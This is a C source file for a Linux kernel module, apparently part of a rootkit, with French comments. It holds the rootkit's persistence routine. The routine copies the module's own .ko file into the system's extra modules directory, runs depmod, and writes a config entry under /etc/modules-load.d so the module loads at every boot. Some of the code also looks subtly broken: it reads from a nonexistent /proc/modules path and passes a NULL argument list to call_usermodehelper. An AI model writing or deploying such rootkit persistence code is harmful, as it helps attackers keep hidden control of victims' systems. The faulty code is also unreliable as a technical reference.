#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "rootkit.h"

/* Déplace le fichier .ko vers /lib/modules/$(uname -r)/extra/ */
static int move_module_file(void)
{
    struct file *src, *dst;
    mm_segment_t old_fs;
    char *src_path, *dst_path;
    char *kernel_version;
    char buffer[4096];
    int ret = 0;
    ssize_t bytes;

    /* Obtenir la version du noyau */
    kernel_version = utsname()->release;

    /* Construire le chemin source */
    src_path = kasprintf(GFP_KERNEL, "/proc/modules/%s.ko", THIS_MODULE->name);
    if (!src_path) return -ENOMEM;

    /* Construire le chemin de destination */
    dst_path = kasprintf(GFP_KERNEL, "/lib/modules/%s/extra/%s.ko", kernel_version, THIS_MODULE->name);
    if (!dst_path) {
        kfree(src_path);
        return -ENOMEM;
    }

    /* Ouvrir les fichiers source et destination */
    src = filp_open(src_path, O_RDONLY, 0);
    dst = filp_open(dst_path, O_WRONLY | O_CREAT, 0644);
    if (IS_ERR(src) || IS_ERR(dst)) {
        ret = -ENOENT;
        goto out;
    }

    /* Copier le contenu du fichier .ko */
    old_fs = get_fs();
    set_fs(KERNEL_DS);

    while ((bytes = kernel_read(src, buffer, sizeof(buffer), &src->f_pos)) > 0) {
        kernel_write(dst, buffer, bytes, &dst->f_pos);
    }

    set_fs(old_fs);

out:
    /* Fermeture des fichiers et libération de la mémoire */
    if (!IS_ERR(src)) filp_close(src, NULL);
    if (!IS_ERR(dst)) filp_close(dst, NULL);
    kfree(src_path);
    kfree(dst_path);

    return ret;
}

/* Fonction principale pour activer la persistance */
int enable_persistence(const char *module_name)
{
    const char *dir_path = "/etc/modules-load.d";
    char *file_path;
    int ret;

    /* Déplacer le module vers le répertoire standard */
    ret = move_module_file();
    if (ret < 0) return ret;

    /* Exécuter depmod pour mettre à jour la base de données des modules */
    call_usermodehelper("/sbin/depmod", NULL, NULL, UMH_WAIT_PROC);

    /* Construire le chemin du fichier de configuration */
    file_path = kasprintf(GFP_KERNEL, "%s/%s.conf", dir_path, module_name);
    if (!file_path) return -ENOMEM;

    /* Vérifier si le module est déjà présent */
    if (is_module_in_file(file_path, module_name)) {
        kfree(file_path);
        return 0;
    }

    /* Ajouter le module dans le fichier de configuration */
    ret = write_to_file(file_path, module_name);
    kfree(file_path);

    return ret;
}
